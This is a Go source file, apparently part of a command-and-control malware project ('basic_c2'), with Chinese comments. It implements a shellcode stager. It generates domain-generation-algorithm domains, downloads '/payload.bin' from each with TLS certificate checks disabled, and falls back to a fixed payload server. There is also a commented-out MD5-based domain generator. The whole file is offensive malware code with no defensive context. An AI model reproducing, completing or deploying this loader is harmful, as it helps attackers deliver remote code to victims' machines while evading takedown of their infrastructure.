package fetch

import (
	"basic_c2/internal/config"
	"basic_c2/internal/dga"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"time"
)

// GenerateDGADomains 生成 DGA 域名列表
/*func GenerateDGADomains(count int) []string {
	domains := make([]string, 0)
	dateStr := time.Now().Format("2006-01-02")
	
	for i := 0; i < count; i++ {
		raw := fmt.Sprintf("%s%s%d", dateStr, config.DGASeed, i)
		hasher := md5.New()
		hasher.Write([]byte(raw))
		hash := hex.EncodeToString(hasher.Sum(nil))
		domain := fmt.Sprintf("https://%s.net", hash[0:12])
		domains = append(domains, domain)
	}
	
	return domains
}*/

// DownloadBytes 下载文件内容
func DownloadBytes(url string) ([]byte, error) {
	fmt.Printf("[DGA] 尝试下载: %s ... ", url)
	
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Timeout:   30 * time.Second,
		Transport: tr,
	}

	resp, err := client.Get(url)
	if err != nil {
		fmt.Println("失败 (网络不可达)")
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		fmt.Printf("失败 (状态码 %d)\n", resp.StatusCode)
		return nil, fmt.Errorf("status %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("失败 (%v)\n", err)
		return nil, err
	}

	fmt.Println("成功!")
	return body, nil
}

// FetchPayload 尝试从多个源下载 Payload
// 先尝试 DGA 域名，失败后使用保底 URL
func FetchPayload() ([]byte, error) {
	var shellcode []byte
	var err error

	// 1. 尝试 DGA 域名
	dgaBaseDomains := dga.GenerateDomains(config.DGACount)
	for _, domain := range dgaBaseDomains {
		downloadURL := domain + "/payload.bin"
		shellcode, err = DownloadBytes(downloadURL)
		if err == nil && len(shellcode) > 0 {
			return shellcode, nil
		}
	}

	// 2. 保底下载
	fmt.Println("[Fallback] 切换至保底服务器...")
	shellcode, err = DownloadBytes(config.FallbackPayloadURL)
	if err != nil {
		return nil, fmt.Errorf("所有下载尝试均失败: %v", err)
	}

	return shellcode, nil
}
